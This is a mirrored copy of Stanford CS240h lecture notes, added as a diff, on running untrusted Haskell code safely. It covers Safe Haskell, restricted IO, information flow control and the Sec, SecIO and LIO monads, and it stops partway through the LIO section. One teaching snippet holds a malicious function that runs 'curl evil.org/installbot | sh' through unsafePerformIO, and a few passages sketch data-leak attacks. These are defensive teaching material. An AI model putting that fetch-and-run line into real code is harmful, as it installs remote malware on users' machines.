@@ -1,0 +1,471 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from www.scs.stanford.edu/11au-cs240h/notes/ifc.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Dec 2016 04:55:13 GMT -->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="generator" content="pandoc" />
+  <title></title>
+  <style type="text/css">
+/*<![CDATA[*/
+table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode, table.sourceCode pre 
+   { margin: 0; padding: 0; border: 0; vertical-align: baseline; border: none; }
+td.lineNumbers { border-right: 1px solid #AAAAAA; text-align: right; color: #AAAAAA; padding-right: 5px; padding-left: 5px; }
+td.sourceCode { padding-left: 5px; }
+code.sourceCode span.kw { color: #007020; font-weight: bold; } 
+code.sourceCode span.dt { color: #902000; }
+code.sourceCode span.dv { color: #40a070; }
+code.sourceCode span.bn { color: #40a070; }
+code.sourceCode span.fl { color: #40a070; }
+code.sourceCode span.ch { color: #4070a0; }
+code.sourceCode span.st { color: #4070a0; }
+code.sourceCode span.co { color: #60a0b0; font-style: italic; }
+code.sourceCode span.ot { color: #007020; }
+code.sourceCode span.al { color: red; font-weight: bold; }
+code.sourceCode span.fu { color: #06287e; }
+code.sourceCode span.re { }
+code.sourceCode span.er { color: red; font-weight: bold; }
+/*]]>*/
+  </style>
+</head>
+<body>
+<h1 id="administrivia">Administrivia</h1>
+<ul>
+<li>Bring your laptop Wednesday
+<ul>
+<li>We are going to try something different</li>
+</ul></li>
+<li>By now you should have figured out your project partners</li>
+<li>Should figure out project by end of week</li>
+<li>Schedule a meeting with one of us
+<ul>
+<li>I am available after 1:15pm tomorrow (Tuesday), and after 2:15pm Wednesday</li>
+</ul></li>
+</ul>
+<h1 id="untrusted-code">Untrusted code</h1>
+<ul>
+<li>Say you want to incorporate untrusted code in a Haskell application</li>
+<li>Example: Some third-party translation software
+<ul>
+<li>You built a web server</li>
+<li>Want to add a &quot;translate to Pig Latin&quot; button to each web page</li>
+<li><p>Download some random code with this function</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">toPigLatin </span><span class="ot">::</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">L.ByteString</span></code></pre></li>
+</ul></li>
+<li>If you could trust the type (no <code>IO</code>), this would be safe to run
+<ul>
+<li>Worst case, users get garbled text on web page</li>
+</ul></li>
+<li><p>However, what if you have?</p>
+<pre class="sourceCode"><code class="sourceCode haskell">toPigLatin <span class="fu">=</span> unsafePerformIO <span class="fu">$</span> <span class="kw">do</span><br />  system <span class="st">&quot;curl evil.org/installbot | sh&quot;</span><br />  <span class="fu">return</span> <span class="st">&quot;Ia owna ouya&quot;</span></code></pre></li>
+</ul>
+<h1 id="safe-haskell"><a href="http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html">Safe Haskell</a></h1>
+<ul>
+<li>Starting with GHC 7.2, <code>-XSafe</code> option enables <a href="http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html">Safe Haskell</a>
+<ul>
+<li>Courtesy of our very own CA, David Terei</li>
+</ul></li>
+<li>Safe Haskell disallows import of any unsafe modules
+<ul>
+<li>E.g., can't import <code>System.IO.Unsafe</code>, so can't call <code>unsafePerformIO</code></li>
+</ul></li>
+<li><p>Safe imports (enabled by <code>-XSafeImports</code>) require an import to be safe</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">import</span> safe <span class="dt">PigLatin</span> (toPigLatin)</code></pre>
+<ul>
+<li>The above should guarantee that <code>toPigLatin</code> doesn't call unsafe functions</li>
+</ul></li>
+<li><p>But wait... doesn't <code>toPigLatin</code> use ByteString?</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="fu">head</span><span class="ot"> </span><span class="ot">::</span> <span class="co">{- Lazy -}</span> <span class="dt">ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Word8</span><br /><span class="fu">head</span> <span class="dt">Empty</span>       <span class="fu">=</span> errorEmptyList <span class="st">&quot;head&quot;</span><br /><span class="fu">head</span> (<span class="dt">Chunk</span> c _) <span class="fu">=</span> S.unsafeHead c<br /><br /><span class="ot">unsafeHead </span><span class="ot">::</span> <span class="co">{- Strict -}</span> <span class="dt">ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Word8</span><br />unsafeHead (<span class="dt">PS</span> x s l) <span class="fu">=</span> assert (l <span class="fu">&gt;</span> <span class="dv">0</span>) <span class="fu">$</span><br />    inlinePerformIO <span class="fu">$</span> withForeignPtr x <span class="fu">$</span> \p <span class="ot">-&gt;</span> peekByteOff p s</code></pre></li>
+</ul>
+<h1 id="safe-vs.-trustworthy">Safe vs. Trustworthy</h1>
+<ul>
+<li>A module compiled <code>-XSafe</code> can only import safe modules
+<ul>
+<li>As if all imports implicitly have <code>safe</code> keyword</li>
+</ul></li>
+<li>But there are <em>two</em> kinds of safe module
+<ol style="list-style-type: decimal">
+<li>Modules verified to be safe by the compiler, compiled <code>-XSafe</code></li>
+<li>Modules asserted to be safe by the author, compiled <code>-XTrustworthy</code></li>
+</ol></li>
+<li>So a module like <code>Data.ByteString</code> can be compiled <code>-XTrustworthy</code>
+<ul>
+<li>Put unsafe functions in separate <code>Data.ByteString.Unsafe</code> module</li>
+<li>Assert <code>Data.ByteString</code>'s exported symbols cannot be used unsafely, even if the module internally makes use of unsafe functions</li>
+</ul></li>
+<li>Of course, might or might not trust module author
+<ul>
+<li>Can specify on a per-package basis whether to honor <code>-XTrustworthy</code></li>
+<li>Use flags, <code>-trust</code> <em>Pkg</em>, <code>-distrust</code> <em>Pkg</em>, <code>-distrust-all-packages</code></li>
+<li>Can also set default for a package with <code>ghc-pkg</code></li>
+</ul></li>
+</ul>
+<h1 id="what-if-untrusted-code-needs-to-do-io">What if untrusted code needs to do IO?</h1>
+<ul>
+<li>Suppose you want to translate to a real language
+<ul>
+<li>Generally requires massive data sets</li>
+<li>Untrusted code would at minimum need to do file IO</li>
+<li>Or maybe easiest send text over network to, e.g., Google translate</li>
+</ul></li>
+<li>Idea: use a <em>restricted</em> IO monad, <code>RIO</code>
+<ul>
+<li><p>Untrusted third party implements <code>googleTranslate</code> function</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">googleTranslate </span><span class="ot">::</span> <span class="dt">Language</span> <span class="ot">-&gt;</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">RIO</span> <span class="dt">L.ByteString</span></code></pre></li>
+<li>But uses the <code>RIO</code> monad, instead of <code>IO</code></li>
+<li>Implement <code>RIO</code> functions to access network, file system</li>
+<li>Have functions reject <em>dangerous</em> operations</li>
+<li><p>Can use same names and port <code>IO</code> code to <code>RIO</code> by manipulating imports</p></li>
+</ul></li>
+</ul>
+<h1 id="example-hypothetical-rio-monad">Example: hypothetical <code>RIO</code> monad</h1>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">{-# LANGUAGE Trustworthy #-}</span><br /><span class="kw">module</span> <span class="dt">RIO</span> (<span class="dt">RIO</span>(), runRIO, RIO.readFile) <span class="kw">where</span><br /><br /><span class="co">-- Notice that symbol UnsafeRIO is not exported from this module!</span><br /><span class="kw">newtype</span> <span class="dt">RIO</span> a <span class="fu">=</span> <span class="dt">UnsafeRIO</span> {<span class="ot"> runRIO </span><span class="ot">::</span> <span class="dt">IO</span> a }<br /><span class="kw">instance</span> <span class="kw">Monad</span> <span class="dt">RIO</span> <span class="kw">where</span><br />    <span class="fu">return</span> <span class="fu">=</span> <span class="dt">UnsafeRIO</span> <span class="fu">.</span> <span class="fu">return</span><br />    m <span class="fu">&gt;&gt;=</span> k <span class="fu">=</span> <span class="dt">UnsafeRIO</span> <span class="fu">$</span> runRIO m <span class="fu">&gt;&gt;=</span> runRIO <span class="fu">.</span> k<br /><br /><span class="co">-- Returns True iff access is allowed to file name</span><br /><span class="ot">pathOK </span><span class="ot">::</span> <span class="fu">FilePath</span> <span class="ot">-&gt;</span> <span class="dt">IO</span> <span class="dt">Bool</span><br />pathOK file <span class="fu">=</span> <span class="co">{- Implement some policy based on file name -}</span><br /><br /><span class="fu">readFile</span><span class="ot"> </span><span class="ot">::</span> <span class="fu">FilePath</span> <span class="ot">-&gt;</span> <span class="dt">RIO</span> <span class="dt">String</span><br /><span class="fu">readFile</span> file <span class="fu">=</span> <span class="dt">UnsafeRIO</span> <span class="fu">$</span> <span class="kw">do</span><br />  ok <span class="ot">&lt;-</span> pathOK file<br />  <span class="kw">if</span> ok <span class="kw">then</span> Prelude.readFile file <span class="kw">else</span> <span class="fu">return</span> <span class="st">&quot;&quot;</span></code></pre>
+<ul>
+<li>Note use of <code>newtype</code> -- <code>RIO</code> is same as <code>IO</code> at runtime
+<ul>
+<li>Anyone can turn an <code>RIO</code> action into an <code>IO</code> one with <code>runRIO</code></li>
+<li>But cannot create <code>RIO</code> action from <code>IO</code> one without <code>UnsafeRIO</code> symbol... not exported, so untrusted code cannot bury <code>IO</code> actions in <code>RIO</code> ones</li>
+</ul></li>
+</ul>
+<h1 id="example-policies-for-rio">Example policies for RIO</h1>
+<ul>
+<li>Only read and write files under some sandbox subdirectory
+<ul>
+<li>Protect most of file system from untrusted code</li>
+</ul></li>
+<li>Do not allow execution of other programs
+<ul>
+<li>Would escape from <code>RIO</code> restrictions</li>
+</ul></li>
+<li>Only allow connections to port 80, and only to known servers
+<ul>
+<li>Don't want untrusted code sending spam, attacking mysql, etc.</li>
+</ul></li>
+<li>Do not allow access to devices
+<ul>
+<li>Microphone, camera, speaker, etc.</li>
+</ul></li>
+<li>Similar to policies that apply to Java/JavaScript in browser</li>
+</ul>
+<h1 id="why-rio-isnt-enough">Why RIO isn't enough</h1>
+<ul>
+<li>What if the web site contains private data, such as email?</li>
+<li>An attack by malicious <code>googleTranslate</code> function:
+<ul>
+<li>Save a copy of private email under <code>/sandbox</code> (allowed)</li>
+<li>When asked to translate a special string, return stored email</li>
+<li>Attacker sends himself an email with special string to read stored email</li>
+</ul></li>
+<li>Another attack
+<ul>
+<li>Send query to attacker's own website instead of Google</li>
+</ul></li>
+<li>Problem: really need to keep track of what information is sensitive
+<ul>
+<li>Okay to send public data over network</li>
+<li>Not okay to send email (or maybe only okay to send to specific Google URL)</li>
+<li>Okay to write files, but have to keep track of which files contain whose email</li>
+</ul></li>
+<li>Solution: Decentralized Information Flow Control (DIFC)</li>
+</ul>
+<h1 id="what-is-difc">What is DIFC?</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/lintro.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>IFC originated with military applications and classified data</li>
+<li>Every piece of data in the system has a label</li>
+<li>Every process/thread has a label</li>
+<li>Labels are partially ordered by <span class="math"> ⊑ </span> (&quot;can flow to&quot;)</li>
+<li>Example: Emacs (labeled <span class="math"><em>L</em><sub><em>E</em></sub></span>) accesses file (labeled <span class="math"><em>L</em><sub><em>F</em></sub></span>)</li>
+</ul>
+<h1 id="what-is-difc-1">What is DIFC?</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/lread.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>IFC originated with military applications and classified data</li>
+<li>Every piece of data in the system has a label</li>
+<li>Every process/thread has a label</li>
+<li>Labels are partially ordered by <span class="math"> ⊑ </span> (&quot;can flow to&quot;)</li>
+<li>Example: Emacs (labeled <span class="math"><em>L</em><sub><em>E</em></sub></span>) accesses file (labeled <span class="math"><em>L</em><sub><em>F</em></sub></span>)
+<ul>
+<li>File read? Information flows from file to emacs. System requires <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub><em>E</em></sub></span>.</li>
+</ul></li>
+</ul>
+<h1 id="what-is-difc-2">What is DIFC?</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/lwrite.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>IFC originated with military applications and classified data</li>
+<li>Every piece of data in the system has a label</li>
+<li>Every process/thread has a label</li>
+<li>Labels are partially ordered by <span class="math"> ⊑ </span> (&quot;can flow to&quot;)</li>
+<li>Example: Emacs (labeled <span class="math"><em>L</em><sub><em>E</em></sub></span>) accesses file (labeled <span class="math"><em>L</em><sub><em>F</em></sub></span>)
+<ul>
+<li>File read? Information flows from file to emacs. System requires <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub><em>E</em></sub></span>.</li>
+<li>File write? Information flows in both directions. System enforces that <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub><em>E</em></sub></span> and <span class="math"><em>L</em><sub><em>E</em></sub> ⊑ <em>L</em><sub><em>F</em></sub></span>.</li>
+</ul></li>
+</ul>
+<h1 id="labels-are-transitive">Labels are transitive</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/trans1.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li><span class="math"> ⊑ </span> is a transitive relation - makes it easier to reason about security</li>
+<li>Example: Label file so it cannot flow to Internet
+<ul>
+<li>Policy holds regardless of what other software does</li>
+</ul></li>
+</ul>
+<h1 id="labels-are-transitive-1">Labels are transitive</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/trans2.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li><span class="math"> ⊑ </span> is a transitive relation - makes it easier to reason about security</li>
+<li>Example: Label file so it cannot flow to Internet
+<ul>
+<li>Policy holds regardless of what other software does</li>
+</ul></li>
+<li>Suppose a buggy app reads file (e.g., desktop search)</li>
+</ul>
+<h1 id="labels-are-transitive-2">Labels are transitive</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/trans3.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li><span class="math"> ⊑ </span> is a transitive relation - makes it easier to reason about security</li>
+<li>Example: Label file so it cannot flow to Internet
+<ul>
+<li>Policy holds regardless of what other software does</li>
+</ul></li>
+<li>Suppose a buggy app reads file (e.g., desktop search)
+<ul>
+<li>Process labeled <span class="math"><em>L</em><sub>bug</sub></span> reads file, so must have <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub>bug</sub></span></li>
+<li>But <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub>bug</sub> ∧ <em>L</em><sub>bug</sub> ⊑ <em>L</em><sub>net</sub> ⇒ <em>L</em><sub><em>F</em></sub> ⊑ <em>L</em><sub>net</sub></span>, thus <span class="math"><em>L</em><sub>bug</sub> ! ⊑ <em>L</em><sub>net</sub></span></li>
+</ul></li>
+</ul>
+<h1 id="labels-are-transitive-3">Labels are transitive</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/trans4.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li><span class="math"> ⊑ </span> is a transitive relation - makes it easier to reason about security</li>
+<li>Example: Label file so it cannot flow to Internet
+<ul>
+<li>Policy holds regardless of what other software does</li>
+</ul></li>
+<li>Conversely, any app that can write to network cannot read file</li>
+</ul>
+<h1 id="labels-form-a-lattice">Labels form a lattice</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/ablattice.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>Consider two users, <span class="math"><em>A</em></span> and <span class="math"><em>B</em></span>
+<ul>
+<li>Label public data <span class="math"><em>L</em><sub>∅</sub></span>, <span class="math"><em>A</em></span>'s private data <span class="math"><em>L</em><sub><em>A</em></sub></span>, <span class="math"><em>B</em></span>'s private data <span class="math"><em>L</em><sub><em>B</em></sub></span></li>
+</ul></li>
+<li>What happens if you mix <span class="math"><em>A</em></span>'s and <span class="math"><em>B</em></span>'s private data in a single document?
+<ul>
+<li>Both <span class="math"><em>A</em></span> and <span class="math"><em>B</em></span> should be concerned about the release of such a document</li>
+<li>Need a label at least as restrictive as both <span class="math"><em>L</em><sub><em>A</em></sub></span> and <span class="math"><em>L</em><sub><em>B</em></sub></span></li>
+<li>Use the least upper bound (a.k.a. <em>join</em>) of <span class="math"><em>L</em><sub><em>A</em></sub></span> and <span class="math"><em>L</em><sub><em>B</em></sub></span>, written <span class="math"><em>L</em><sub><em>A</em></sub> ⊓ <em>L</em><sub><em>B</em></sub></span></li>
+</ul></li>
+</ul>
+<h1 id="difc-is-decentralized"><strong>D</strong>IFC is <strong>D</strong>ecentralized</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/decentralized.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>Every process has a set of privileges</li>
+<li>Exercising privilege <span class="math"><em>p</em></span> changes label requirements
+<ul>
+<li><span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <sub><em>p</em></sub> <em>L</em><sub>proc</sub></span> to read, and additionally <span class="math"><em>L</em><sub>proc</sub> ⊑ <sub><em>p</em></sub> <em>L</em><sub><em>F</em></sub></span> to write file</li>
+<li><span class="math"> ⊑ <sub><em>p</em></sub></span> (``can flow under privileges <span class="math"><em>p</em></span>'') is more permissive than <span class="math"> ⊑ </span></li>
+</ul></li>
+<li>Idea: Set labels so you know who has relevant privs.</li>
+</ul>
+<h1 id="example-privileges">Example privileges</h1>
+<div class="figure">
+<img src="http://www.scs.stanford.edu/11au-cs240h/notes/ablattice.svg" /><p class="caption"></p>
+</div>
+<ul>
+<li>Consider again simple two user lattice</li>
+<li>Let <span class="math"><em>a</em></span> be user <span class="math"><em>A</em></span>'s privileges, <span class="math"><em>b</em></span> be user <span class="math"><em>B</em></span>'s privileges</li>
+<li>Clearly <span class="math"><em>L</em><sub><em>A</em></sub> ⊑ <sub><em>a</em></sub> <em>L</em><sub>∅</sub></span> and <span class="math"><em>L</em><sub><em>B</em></sub> ⊑ <sub><em>b</em></sub> <em>L</em><sub>∅</sub></span>
+<ul>
+<li>Users should be able to make public or <em>declassify</em> their own private data</li>
+</ul></li>
+<li>Users should also be able to <em>partially declassify</em> data
+<ul>
+<li>I.e., <span class="math"><em>L</em><sub><em>A</em><em>B</em></sub> ⊑ <sub><em>a</em></sub> <em>L</em><sub><em>B</em></sub></span> and <span class="math"><em>L</em><sub><em>A</em><em>B</em></sub> ⊑ <sub><em>b</em></sub> <em>L</em><sub><em>A</em></sub></span></li>
+</ul></li>
+</ul>
+<h1 id="the-sec-monad-russo-russo">The <code>Sec</code> monad <a href="http://www.cse.chalmers.se/~russo/seclib.htm">[Russo]</a>, <a href="http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml">[Russo]</a></h1>
+<ul>
+<li>Let's encode a really simple two-point lattice in Haskell's type system
+<ul>
+<li>Let type <code>H</code> represent secret (&quot;high&quot;) data, and <code>L</code> public (&quot;low&quot;) data</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="dt">Module</span> <span class="dt">Sec</span> <span class="kw">where</span><br /><span class="kw">data</span> <span class="dt">L</span> <span class="fu">=</span> <span class="dt">Lpriv</span><br /><span class="kw">data</span> <span class="dt">H</span> <span class="fu">=</span> <span class="dt">Hpriv</span></code></pre>
+<ul>
+<li>Type represents secrecy level, constructor represents privileges</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">{-# LANGUAGE Trustworthy #-}</span><br /><span class="dt">Module</span> <span class="dt">Sec.Safe</span> (<span class="kw">module</span> <span class="dt">Sec</span>) <span class="kw">where</span><br /><span class="kw">import</span> <span class="dt">Sec</span> (<span class="dt">L</span>, <span class="dt">H</span>, <span class="dt">Sec</span>, sec, open, up)</code></pre>
+<ul>
+<li>Let's also (in module <code>Sec</code>) represent the lattice (<span class="math"><em>L</em> ⊑ <em>H</em></span>) in the type system</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">class</span> <span class="dt">Flows</span> sl sh <span class="kw">where</span><br /><span class="kw">instance</span> <span class="dt">Flows</span> <span class="dt">L</span> <span class="dt">L</span> <span class="kw">where</span><br /><span class="kw">instance</span> <span class="dt">Flows</span> <span class="dt">L</span> <span class="dt">H</span> <span class="kw">where</span><br /><span class="kw">instance</span> <span class="dt">Flows</span> <span class="dt">H</span> <span class="dt">H</span> <span class="kw">where</span><br /><span class="co">-- Notice no instance for Flows H L</span></code></pre></li>
+</ul>
+<h1 id="the-sec-monad-continued">The <code>Sec</code> monad (continued)</h1>
+<ul>
+<li>Let's protect secret values with monads by adding to module <code>Sec</code>
+<ul>
+<li>Define two monads, <code>Sec H</code> for high data, and <code>Sec L</code> for low data</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">newtype</span> <span class="dt">Sec</span> s a <span class="fu">=</span> <span class="dt">MkSec</span> a<br /><br /><span class="kw">instance</span> <span class="kw">Monad</span> (<span class="dt">Sec</span> s) <span class="kw">where</span><br />  <span class="fu">return</span> x <span class="fu">=</span> <span class="dt">MkSec</span> x<br />  <span class="dt">MkSec</span> a <span class="fu">&gt;&gt;=</span> k <span class="fu">=</span> k a</code></pre>
+<ul>
+<li>Allow anyone to label a value, but require privileges to unlabel</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">label </span><span class="ot">::</span> a <span class="ot">-&gt;</span> <span class="dt">Sec</span> s a<br />label x <span class="fu">=</span> <span class="dt">MkSec</span> x<br /><span class="ot">unlabel </span><span class="ot">::</span> <span class="dt">Sec</span> s a <span class="ot">-&gt;</span> s <span class="ot">-&gt;</span> a<br />unlabel (<span class="dt">MkSec</span> a) s <span class="fu">=</span> s <span class="ot">`seq`</span> a     <span class="co">-- s (H or L) acts like key</span></code></pre>
+<ul>
+<li>Notice <code>seq</code> call, ensures &quot;<code>unlabel undefined secval</code>&quot; will crash</li>
+<li>Allow data to be re-labeled according to <span class="math"> ⊑ </span> relation</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">relabel </span><span class="ot">::</span> (<span class="dt">Flows</span> lin lout) <span class="ot">=&gt;</span> <span class="dt">Sec</span> lin a <span class="ot">-&gt;</span> <span class="dt">Sec</span> lout a<br />relabel (<span class="dt">MkSec</span> val) <span class="fu">=</span> <span class="dt">MkSec</span> val</code></pre></li>
+</ul>
+<h1 id="applying-the-sec-monad">Applying the <code>Sec</code> monad</h1>
+<ul>
+<li>Untrusted code gets access to sensitive data only in <code>Sec</code> monads</li>
+<li>Possible policy:
+<ul>
+<li>Data labeled <code>Sec L</code> can be sent over network</li>
+<li>Data labeled <code>Sec H</code> can only be sent to Google</li>
+<li>Implement by providing specific trusted functions</li>
+</ul>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">queryGoogle </span><span class="ot">::</span> <span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">IO</span> (<span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span>)<br />queryGoogle labeledQuery <span class="fu">=</span> <span class="kw">do</span><br />  <span class="kw">let</span> query <span class="fu">=</span> unlabel <span class="dt">Hpriv</span> labeledQuery  <span class="co">-- code is privileged,</span><br />  <span class="fu">...</span>                                     <span class="co">-- so have Hpriv</span></code></pre></li>
+<li>This isn't a very satisfying solution
+<ul>
+<li>Decision to query google can't depend on data</li>
+<li>So we aren't really getting the full benefit of monads (more like <code>Applicative</code>)</li>
+</ul></li>
+</ul>
+<h1 id="io-and-sec"><code>IO</code> and <code>Sec</code></h1>
+<ul>
+<li><p>What if instead we combined <code>Sec</code> and <code>IO</code>?</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">untrustedTranslate </span><span class="ot">::</span> <span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Sec</span> <span class="dt">H</span> (<span class="dt">IO</span> <span class="dt">L.ByteString</span>)</code></pre></li>
+<li><p>Safe to run this computation?</p></li>
+</ul>
+<h1 id="io-and-sec-1"><code>IO</code> and <code>Sec</code></h1>
+<ul>
+<li><p>What if instead we combined <code>Sec</code> and <code>IO</code>?</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">untrustedTranslate </span><span class="ot">::</span> <span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">Sec</span> <span class="dt">H</span> (<span class="dt">IO</span> <span class="dt">L.ByteString</span>)</code></pre></li>
+<li><p>Safe to run this computation? <strong>No!</strong></p>
+<pre class="sourceCode"><code class="sourceCode haskell">untrustedTranslate secbs <span class="fu">=</span> <span class="kw">do</span><br />  bs <span class="ot">&lt;-</span> secbs<br />  <span class="fu">return</span> <span class="fu">$</span> <span class="kw">do</span> <span class="fu">writeFile</span> <span class="st">&quot;PublicFile&quot;</span> bs <span class="co">-- oops, pwned</span><br />              <span class="co">{- query Google for translation -}</span></code></pre></li>
+<li><p>Let's combines idea of <code>RIO</code> and <code>Sec</code> in a <code>SecIO</code> monad</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="kw">newtype</span> <span class="dt">SecIO</span> s a <span class="fu">=</span> <span class="dt">MkSecIO</span> (<span class="dt">IO</span> (<span class="dt">Sec</span> s a))<br /><span class="kw">instance</span> <span class="kw">Monad</span> (<span class="dt">SecIO</span> s) <span class="kw">where</span><br />    <span class="fu">return</span> x <span class="fu">=</span> <span class="dt">MkSecIO</span> (<span class="fu">return</span> (<span class="fu">return</span> x))<br />    <span class="dt">MkSecIO</span> m <span class="fu">&gt;&gt;=</span> k <span class="fu">=</span> <span class="dt">MkSecIO</span> <span class="fu">$</span> <span class="kw">do</span><br />      sa <span class="ot">&lt;-</span> m<br />      <span class="kw">let</span> (<span class="dt">MkSec</span> a) <span class="fu">=</span> sa<br />      <span class="kw">let</span> <span class="dt">MkSecIO</span> m' <span class="fu">=</span> k a<br />      m'<br /><span class="ot">run </span><span class="ot">::</span> <span class="dt">SecIO</span> s a <span class="ot">-&gt;</span> <span class="dt">IO</span> (<span class="dt">Sec</span> s a)<br />run (<span class="dt">MkSecIO</span> m) <span class="fu">=</span> m</code></pre></li>
+</ul>
+<h1 id="the-secio-monad">The <code>SecIO</code> monad</h1>
+<ul>
+<li><p>What does <code>SecIO</code> mean</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="co">-- Can write to high files and returns high Int</span><br /><span class="ot">c1 </span><span class="ot">::</span> <span class="dt">SecIO</span> <span class="dt">H</span> <span class="dt">Int</span><br /><br /><span class="co">-- Can write to low or high files, returns high Int</span><br /><span class="ot">c2 </span><span class="ot">::</span> <span class="dt">SecIO</span> <span class="dt">L</span> (<span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">Int</span>)<br /><br /><span class="co">-- Can write to low or high files, returns low Int</span><br /><span class="ot">c3 </span><span class="ot">::</span> <span class="dt">SecIO</span> <span class="dt">L</span> <span class="dt">Int</span></code></pre></li>
+<li><p>How to represent files?</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="co">-- Must encode level of file in type, path of file in value</span><br /><span class="kw">type</span> <span class="dt">File</span> s <span class="fu">=</span> <span class="dt">SecFilePath</span> <span class="dt">String</span><br /><br /><span class="ot">readFileSecIO </span><span class="ot">::</span> <span class="dt">File</span> s <span class="ot">-&gt;</span> <span class="dt">SecIO</span> s' (<span class="dt">Sec</span> s <span class="dt">String</span>)<br /><span class="ot">writeFileSecIO </span><span class="ot">::</span> <span class="dt">File</span> s <span class="ot">-&gt;</span> <span class="dt">String</span> <span class="ot">-&gt;</span> <span class="dt">SecIO</span> s ()</code></pre>
+<ul>
+<li>Idea extends to other types of resources (e.g., <code>IORef</code>s)</li>
+</ul></li>
+</ul>
+<!--
+    type DataInvariant a = (a -> IO Bool)
+    data Loc t s a b = MkLoc t (DataInvariant a) (DataInvariant a)
+    type File s = Loc FilePath s String ()
+-->
+
+<h1 id="secio-translator"><code>SecIO</code> translator</h1>
+<ul>
+<li><p>Still need privileged function</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">queryGoogle </span><span class="ot">::</span> <span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">SecIO</span> <span class="dt">H</span> <span class="dt">L.ByteString</span></code></pre>
+<ul>
+<li>Represents the fact that Google is trusted with high data</li>
+<li>Makes sense you need to implement this to encode policy</li>
+</ul></li>
+<li><p>Now implement untrusted code as follows</p>
+<pre class="sourceCode"><code class="sourceCode haskell"><span class="ot">untrustedTranslate </span><span class="ot">::</span> <span class="dt">Sec</span> <span class="dt">H</span> <span class="dt">L.ByteString</span> <span class="ot">-&gt;</span> <span class="dt">SecIO</span> <span class="dt">H</span> <span class="dt">L.ByteString</span></code></pre>
+<ul>
+<li>Function can invoke <code>queryGoogle</code>, but not send data to other places</li>
+</ul></li>
+<li><code>SecIO</code> does most enforcement at compile time</li>
+<li>Problem: for email, really want separate labels for every <em>user</em>
+<ul>
+<li>Users added dynamically, so hard to encode this with <code>Flows</code>...</li>
+</ul></li>
+</ul>
+<h1 id="lio-monad-stefan"><code>LIO</code> Monad <a href="http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf">[Stefan]</a></h1>
+<ul>
+<li>More flexibility if you enforce all permission checks dynamically</li>
+<li>Let's define <code>Label</code>s as points on a lattice
+<ul>
+<li>Can be arbitrary data type with <span class="math"> ⊑ </span>, <span class="math"> ⊓ </span>, and <span class="math"> ⊔ </span></li>
+</ul>
